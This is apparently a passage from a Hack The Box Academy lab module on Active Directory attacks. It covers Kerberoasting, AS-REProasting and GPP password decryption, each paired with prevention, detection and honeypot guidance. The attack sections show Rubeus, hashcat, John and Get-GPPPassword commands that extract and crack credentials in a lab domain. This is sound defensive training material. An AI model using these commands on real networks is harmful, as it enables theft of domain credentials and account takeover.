<p>There is a significant difference in the cracking speed between these three, as AES is slower to crack than the others. While security best practices recommend disabling <code>RC4</code> (and <code>DES</code>, if enabled for some reason), most environments do not. The caveat is that not all application vendors have migrated to support AES (most but not all). By default, the ticket created by the <code>KDC</code> will be one with the most robust/highest encryption algorithm supported. However, attackers can force a downgrade back to <code>RC4</code>.</p>
<hr>
<h3 id="attack-path">Attack path</h3>
<p>To obtain crackable tickets, we can use <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>. When we run the tool with the <code>kerberoast</code> action without specifying a user, it will extract tickets for every user that has an SPN registered (this can easily be in the hundreds in large environments):</p>
<p>Kerberoasting</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe kerberoast /outfile:spn.txt

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : eagle.local
[*] Searching path 'LDAP://DC1.eagle.local/DC=eagle,DC=local' for '(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : Administrator
[*] DistinguishedName      : CN=Administrator,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : http/pki1
[*] PwdLastSet             : 07/08/2022 12.24.13
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt


[*] SamAccountName         : webservice
[*] DistinguishedName      : CN=web service,CN=Users,DC=eagle,DC=local
[*] ServicePrincipalName   : cvs/dc1.eagle.local
[*] PwdLastSet             : 13/10/2022 13.36.04
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\bob\Downloads\spn.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\spn.txt
PS C:\Users\bob\Downloads&gt;</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes1.png" alt="Roasted hashes"></p>
<p>We then need to move the extracted file with the tickets to the Kali Linux VM for cracking (we will only focus on the one for the account Administrator, even though <code>Rubeus</code> extracted two tickets).</p>
<p>We can use <code>hashcat</code> with the hash-mode (option <code>-m</code>) <code>13100</code> for a <code>Kerberoastable TGS</code>. We also pass a dictionary file with passwords (the file <code>passwords.txt</code>) and save the output of any successfully cracked tickets to a file called <code>cracked.txt</code>:</p>
<p>Kerberoasting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">13100</span> -a <span class="hljs-number">0</span> spn.txt passwords.txt --outfile=<span class="hljs-string">"cracked.txt"</span>

hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.5</span>) starting

&lt;SNIP&gt;

Host memory required for this attack: <span class="hljs-number">0</span> MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: <span class="hljs-number">10002</span>
* Bytes.....: <span class="hljs-number">76525</span>
* Keyspace..: <span class="hljs-number">10002</span>
* Runtime...: <span class="hljs-number">0</span> secs

Approaching final keyspace - workload adjusted.           


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">13100</span> (Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP)
Hash.Target......: $krb5tgs$<span class="hljs-number">23</span>$*Administrator$eagle.local$http/pki1@ea..<span class="hljs-number">.42</span>bb2c
Time.Started.....: Tue Dec <span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">10</span> <span class="hljs-number">2022</span>, (<span class="hljs-number">0</span> secs)
Time.Estimated...: Tue Dec <span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">10</span> <span class="hljs-number">2022</span>, (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:   <span class="hljs-number">143.1</span> kH/s (<span class="hljs-number">0.67</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">10002</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">100.00</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">9216</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">92.14</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: <span class="hljs-number">20041985</span> -&gt; brady
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">26</span>%

Started: Tue Dec <span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-number">35</span> <span class="hljs-number">2022</span>
Stopped: Tue Dec <span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">40</span>:<span class="hljs-number">11</span> <span class="hljs-number">2022</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes3.png" alt="Roasted hashes3"></p>
<p>(If <code>hashcat</code> gives an error, we may need to pass <code>--force</code> as an argument at the end of the command.)</p>
<p>Once <code>hashcat</code> finishes cracking, we can read the file &#39;cracked.txt&#39; to see the password <code>Slavi123</code> in plain text:</p>
<p>Kerberoasting</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ cat cracked.txt

$krb5tgs$23$*Administrator$eagle.<span class="hljs-keyword">local</span>$http/pki1<span class="hljs-symbol">@eagle</span>.<span class="hljs-keyword">local</span>*$ab67a0447d7db2945a28d19802d0da64$b6a6a8d3fa2e9e6b47dac1448ade064b5e9d7e04eb4adb5d97a3ef5fd35c8a5c3b9488f09a98b5b8baeaca48483df287495a31a59ccb07209c84e175eef91dc5e4ceb9f7865584ca906965d4bff757bee3658c3e3f38b94f7e1465cd7745d0d84ff3bb67fe370a07cb7f5f350aa26c3f292ee1d7bc31b97db7543182a950c4458ee45f1ff58d1c03b713d11a559f797b85f575aabb72de974cf48c80cbbc78db245c496d3f78c50de655e6572627904753fe223148bc32063c6f032ecdcb901012a98c029de2676905aff97024c89c9d62a73b5f4a614dfd37b90a30a3335326c61b27e788619f84dc0993661be9a9d631d8e4d89d70023b27e5756a23c374f1a59ed15dbe28147296fae252a6d55d663d61759d6ee002b4d3814ada1cafb8997ed594f1cfab6cdb503058b73e192228257d834fd420e9dbc5c12cfffb2077aa5f2abef8cac07ee6cdc7630be71ed174ee167ea0d95df14f48e3e576aa4f90b23d44378d4533cbad945b830bf59f2814ff2dec8832561c3c67bd43afebb231d8f16b1f218dfda803619a47ac833330dde29b34eb73a4aba7da93d7664b92534e44beb80b5ad22a5f80d72f5c476f1796d041ade455eee50651d746db75490bd9a7165b2638c79973fc03c63a67e2659e3057fbe2bce22175116a3892e95a418a02908e0daea3293dc01cd172b524217efe56d842cf8b6f369f30657cd40fe482467d4f2a3a7f3c1caf52cf5f2afc7454fb934a0fb13a0da76dbcefecc32da3a719cd37f944ea13589ce373163d56eb5e8c2dc3fb567b1c5959b7e4e3e054ea9a5561776bed7c2d9eb3107645efce5d22a033891758ac57b187a19006abdbe3f5d53edfc09e5359bc52538afef759c37fbe00cc46e4968ec69072761c2c796bd8e924521cc6c3a50fc1db09e5ce1d443ff3962ca1878904a8252d4f827bcb1e6d6c38bf1fd8ccc21d70751008ece94699aa3caa7e671cb48afc8eb3ecbf181c6e0ed52f740f07e87025c28e4fd832192a66bc390923ea397527264fe382056be78d791f80d0343bbf60ffd09dce061825595f69b939eaa517dc89f4527094bda0ae6febb03d8af3fb3e527e8b5501bbd807ed23ed9bcf85b74be699bd42a284318c42d90dbbd4df332d654529b23a5d81bedec69dba2f3e308d7f8db058377055c15b9eae6275f60a7ec1d52077546caa2b78cf798769a0096d590bb5d5d5173a67a32c2eba174e067a9bf8b4e1f190f8816bf2d6741a8bd6e4e1a6e7ca5ac745061a93cde0ab03ee8cf1de80afa0674a4248d38efdc77aca269e2388c43c83a3919ef80e9a9f0005b1b40026fc29e6262091cbc4f062cf95d5d7e051c019cd0bd5e85b8dcb16b17fd92820e1e1581265a4472c3a5d1f42bb2c:Slavi123
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/Roast-hashes2.png" alt="Roasted hashes2"></p>
<p>Alternatively, the captured TGS hashes can be cracked with <code>John The Ripper</code>:</p>
<p>Kerberoasting</p>
<pre><code class="lang-shell-session">┌─<span class="hljs-comment">[eu-academy-2]</span>─<span class="hljs-comment">[10.10.15.245]</span>─<span class="hljs-comment">[htb-ac-594497@htb-mw2xldpqoq]</span>─<span class="hljs-comment">[~]</span>
└──╼ <span class="hljs-comment">[★]</span>$ sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 <span class="hljs-comment">[MD4 HMAC-MD5 RC4]</span>)
Node numbers 1-4 <span class="hljs-keyword">of</span> 4 (fork)
Slavi123         (?)
Slavi123         (?)
</code></pre>
<hr>
<h3 id="prevention">Prevention</h3>
<p>The success of this attack depends on the strength of the service account&#39;s password. While we should limit the number of accounts with SPNs and disable those no longer used/needed, we must ensure they have strong passwords. For any service that supports it, the password should be 100+ random characters (127 being the maximum allowed in AD), which ensures that cracking the password is practically impossible.</p>
<p>There is also what is known as <a href="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">Group Managed Service Accounts</a> (<code>GMSA</code>), which is a particular type of a service account that Active Directory automatically manages; this is a perfect solution because these accounts are bound to a specific server, and no user can use them anywhere else. Additionally, Active Directory automatically rotates the password of these accounts to a random 127 characters value. There is a caveat: not all applications support these accounts, as they work mainly with Microsoft services (such as <code>IIS</code> and <code>SQL</code>) and a few other apps that have made integration possible. However, we should utilize them everywhere possible and start enforcing their use for new services that support them to out phase current accounts eventually.</p>
<p>When in doubt, do not assign SPNs to accounts that do not need them. Ensure regular clean-up of SPNs set to no longer valid services/servers.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>When a <code>TGS</code> is requested, an event log with ID <code>4769</code> is generated. However, AD also generates the same event ID whenever a user attempts to connect to a service, which means that the volume of this event is gigantic, and relying on it alone is virtually impossible to use as a detection method. If we happen to be in an environment where all applications support AES and only AES tickets are generated, then it would be an excellent indicator to alert on event ID <code>4769</code>. If the ticket options is set for <code>RC4</code>, that is, if <code>RC4</code> tickets are generated in the AD environment (which is not the default configuration), then we should alert and follow up on it. Here is what was logged when we requested the ticket to perform this attack:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/Detect1.png" alt="Roasted hashes2"></p>
<p>Even though the general volume of this event is quite heavy, we still can alert against the default option on many tools. When we run &#39;Rubeus&#39;, it will extract a ticket for <code>each</code> user in the environment with an SPN registered; this allows us to alert if anyone generates more than ten tickets within a minute (for example, but it could be less than ten). This event ID should be grouped by the user requesting the tickets and the machine the requests originated from. Ideally, we need to aim to create two separate rules that alert both. In our playground environment, there are two users with SPNs, so when we executed <code>Rubeus</code>, AD generated the following events:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/Detect2.png" alt="Roasted hashes2"></p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>A <code>honeypot user</code> is a perfect detection option to configure in an AD environment; this must be a user with no real use/need in the environment, so no service tickets are generated regularly. In this case, any attempt to generate a service ticket for this account is likely malicious and worth inspecting. There are a few things to ensure when using this account:</p>
<ul>
<li>The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).</li>
<li>The password should not have been changed recently. A good target is 2+ years, ideally five or more. But the password must be strong enough that the threat agents cannot crack it.</li>
<li>The account must have some privileges assigned to it; otherwise, obtaining a ticket for it won&#39;t be of interest (assuming that an advanced adversary obtains tickets only for interesting accounts/higher likelihood of cracking, e.g., due to an old password).</li>
<li>The account must have an SPN registered, which appears legit. <code>IIS</code> and <code>SQL</code> accounts are good options because they are prevalent.</li>
</ul>
<p>An added benefit to honeypot users is that any activity with this account, whether successful or failed logon attempts, is suspicious and should be alerted.</p>
<p>If we go back to our playground environment and configure the user <code>svc-iam</code> (probably an old IAM account leftover) with the recommendations above, then any request to obtain a TGS for that account should be alerted on:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A1/honeypot1.png" alt="Roasted hashes2"></p>
<hr>
<h3 id="be-careful-">Be Careful!</h3>
<p>Although we give examples of <code>honeypot</code> detections in many of the attacks described, it does not mean an AD environment should implement every single one. That would make it evident to a threat actor that the AD administrator(s) have set many traps. We must consider all the detections and enforce the ones that work best for our AD environment.</p>
<h2 id="as-reproasting">AS-REProasting</h2>
<hr>
<h3 id="description">Description</h3>
<p>The <code>AS-REProasting</code> attack is similar to the <code>Kerberoasting</code> attack; we can obtain crackable hashes for user accounts that have the property <code>Do not require Kerberos preauthentication</code> enabled. The success of this attack depends on the strength of the user account password that we will crack.</p>
<hr>
<h3 id="attack">Attack</h3>
<p>To obtain crackable hashes, we can use <code>Rubeus</code> again. However, this time, we will use the <code>asreproast</code> action. If we don&#39;t specify a name, <code>Rubeus</code> will extract hashes for each user that has <code>Kerberos preauthentication</code> not required:</p>
<p>AS-REProasting</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.1


[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC2.eagle.local (172.16.18.4)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A2/AsrepReq.png" alt="Roasted hashes"></p>
<p>Once <code>Rubeus</code> obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.</p>
<p>For <code>hashcat</code> to be able to recognize the hash, we need to edit it by adding <code>23$</code> after <code>$krb5asrep$</code>:</p>
<p>AS-REProasting</p>
<pre><code class="lang-shell-session">$krb5asrep$23$anni<span class="hljs-symbol">@eagle</span>.<span class="hljs-keyword">local</span>:<span class="hljs-number">1</span>b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
</code></pre>
<p>We can now use <code>hashcat</code> with the hash-mode (option -m) <code>18200</code> for <code>AS-REPRoastable</code> hashes. We also pass a dictionary file with passwords (the file <code>passwords.txt</code>) and save the output of any successfully cracked tickets to the file <code>asrepcracked.txt</code>:</p>
<p>AS-REProasting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo hashcat -m <span class="hljs-number">18200</span> -a <span class="hljs-number">0</span> asrep.txt passwords.txt --outfile asrepcrack.txt --force

hashcat (v6<span class="hljs-number">.2</span><span class="hljs-number">.5</span>) starting

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: <span class="hljs-number">10002</span>
* Bytes.....: <span class="hljs-number">76525</span>
* Keyspace..: <span class="hljs-number">10002</span>
* Runtime...: <span class="hljs-number">0</span> secs

Approaching final keyspace - workload adjusted.           


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: <span class="hljs-number">18200</span> (Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS-REP)
Hash.Target......: $krb5asrep$<span class="hljs-number">23</span>$anni@eagle.local:<span class="hljs-number">1</span>b912b858c4551c0013d..<span class="hljs-number">.3</span>d2550
Time.Started.....: Thu Dec <span class="hljs-number">8</span> <span class="hljs-number">06</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span>, (<span class="hljs-number">0</span> secs)
Time.Estimated...: Thu Dec <span class="hljs-number">8</span> <span class="hljs-number">06</span>:<span class="hljs-number">08</span>:<span class="hljs-number">47</span> <span class="hljs-number">2022</span>, (<span class="hljs-number">0</span> secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:   <span class="hljs-number">130.2</span> kH/s (<span class="hljs-number">0.65</span>ms) @ Accel:<span class="hljs-number">256</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">10002</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">100.00</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">9216</span>/<span class="hljs-number">10002</span> (<span class="hljs-number">92.14</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidate.Engine.: Device Generator
Candidates.#<span class="hljs-number">1.</span>...: <span class="hljs-number">20041985</span> -&gt; brady
Hardware.Mon.#<span class="hljs-number">1.</span>.: Util: <span class="hljs-number">26</span>%

Started: Thu Dec <span class="hljs-number">8</span> <span class="hljs-number">06</span>:<span class="hljs-number">08</span>:<span class="hljs-number">11</span> <span class="hljs-number">2022</span>
Stopped: Thu Dec <span class="hljs-number">8</span> <span class="hljs-number">06</span>:<span class="hljs-number">08</span>:<span class="hljs-number">49</span> <span class="hljs-number">2022</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A2/AsrepReqCrack.png" alt="Roasted hashes"></p>
<p>Once <code>hashcat</code> cracks the password, we can print the contents of the output file to obtain the cleartext password <code>Slavi123</code>:</p>
<p>AS-REProasting</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ sudo cat asrepcrack.txt

$krb5asrep$23$anni<span class="hljs-symbol">@eagle</span>.<span class="hljs-keyword">local</span>:<span class="hljs-number">1</span>b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A2/AsrepReqCracked.png" alt="Roasted hashes"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>As mentioned before, the success of this attack depends on the strength of the password of users with <code>Do not require Kerberos preauthentication</code> configured.</p>
<p>First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>When we executed Rubeus, an Event with ID <code>4768</code> was generated, signaling that a <code>Kerberos Authentication ticket</code> was generated:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A2/AsrepDetect.png" alt="Roasted hashes"></p>
<p>The caveat is that AD generates this event for every user that authenticates with Kerberos to any device; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to correlate known good logins against potential malicious hash extractions. It may be hard to inspect specific IP addresses, especially if a user moves around office locations. However, it is possible to scrutinize the particular VLAN and alert on anything outside it.</p>
<hr>
<h3 id="honeypot">Honeypot</h3>
<p>For this attack, a <code>honeypot user</code> is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.</p>
<p>However, suppose the honeypot user is the only account with <code>Kerberos Pre-Authentication not required</code>. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. (I did previously hear from an organization that needed one of these accounts (application related) that the &#39;security through obscurity&#39; behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)</p>
<p>To make a good honeypot user, we should ensure the following:</p>
<ul>
<li>The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).</li>
<li>For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.</li>
<li>The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.</li>
<li>The account must have some privileges assigned to it; otherwise, it won&#39;t be interesting to try to crack its password&#39;s hash.</li>
</ul>
<p>If we go back to our playground environment and configure the user &#39;svc-iam&#39; (presumably an old IAM account leftover) with the recommendations above, then any request to obtain a TGT for that account should be alerted on. The event received would look like this:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A2/honeypot2.png" alt="Roasted hashes"></p>
<h2 id="gpp-passwords">GPP Passwords</h2>
<hr>
<h3 id="description">Description</h3>
<p><code>SYSVOL</code> is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>. When Microsoft released it with the Windows Server 2008, <code>Group Policy Preferences</code> (<code>GPP</code>) introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in <code>SYSVOL</code>.</p>
<p>During engagements, we might encounter scheduled tasks and scripts executed under a particular user and contain the username and an encrypted version of the password in XML policy files. The encryption key that AD uses to encrypt the XML policy files (the <code>same</code> for all Active Directory environments) was released on Microsoft Docs, allowing anyone to decrypt credentials stored in the policy files. Anyone can decrypt the credentials because the <code>SYSVOL</code> folder is accessible to all &#39;Authenticated Users&#39; in the domain, which includes users and computers. Microsoft published the <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">AES private key on MSDN</a>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/GPPkey1.png" alt="Roasted hashes"></p>
<p>Also, as a reference, this is what an example XML file containing an encrypted password looks like (note that the property is called <code>cpassword</code>):</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/GPPcPass.png" alt="Roasted hashes"></p>
<hr>
<h3 id="attack">Attack</h3>
<p>To abuse <code>GPP Passwords</code>, we will use the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a> function from <code>PowerSploit</code>, which automatically parses all XML files in the Policies folder in <code>SYSVOL</code>, picking up those with the <code>cpassword</code> property and decrypting them once detected:</p>
<p>GPP Passwords</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">bob</span></span><span class="hljs-tag">\<span class="hljs-name">Downloads</span></span>&gt; Import-Module .<span class="hljs-tag">\<span class="hljs-name">Get</span></span>-GPPPassword.ps1
PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">bob</span></span><span class="hljs-tag">\<span class="hljs-name">Downloads</span></span>&gt; Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : <span class="hljs-tag">\<span class="hljs-name">\</span></span>EAGLE.LOCAL<span class="hljs-tag">\<span class="hljs-name">SYSVOL</span></span><span class="hljs-tag">\<span class="hljs-name">eagle</span></span>.local<span class="hljs-tag">\<span class="hljs-name">Policies</span></span><span class="hljs-tag">\<span class="hljs-name">{</span></span>73C66DBB-81DA-44D8-BDEF-20BA2C27056D}<span class="hljs-tag">\<span class="hljs-name">
</span></span>            Machine<span class="hljs-tag">\<span class="hljs-name">Preferences</span></span><span class="hljs-tag">\<span class="hljs-name">Groups</span></span><span class="hljs-tag">\<span class="hljs-name">Groups</span></span>.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/GPPPass.png" alt="Roasted hashes"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>Once the encryption key was made public and started to become abused, Microsoft released a patch (<code>KB2962486)</code> in 2014 to prevent <code>caching credentials</code> in GPP. Therefore, GPP should no longer store passwords in new patched environments. However, unfortunately, there are a multitude of Active Directory environments built after 2015, which for some reason, do contain credentials in <code>SYSVOL</code>. It is therefore highly recommended to continuously assess and review the environment to ensure that no credentials are exposed here.</p>
<p>It is crucial to know that if an organization built its AD environment before 2014, it is likely that its credentials are still cached because the patch does not clear existing stored credentials (only prevents the caching of new ones).</p>
<hr>
<h3 id="detection">Detection</h3>
<p>There are two detection techniques for this attack:</p>
<ul>
<li>Accessing the XML file containing the credentials should be a red flag if we are auditing file access; this is more realistic (due to volume otherwise) regarding detection if it is a dummy XML file, not associated with any GPO. In this case, there will be no reason for anyone to touch this file, and any attempt is likely suspicious. As demonstrated by <code>Get-GPPPasswords</code>, it parses all of the XML files in the Policies folder. For auditing, we can generate an event whenever a user reads the file:</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/audit1.png" alt="Roasted hashes"></p>
<p>Once auditing is enabled, any access to the file will generate an Event with the ID <code>4663</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A3/audit2.png" alt="Roasted hashes"></p>
<ul>
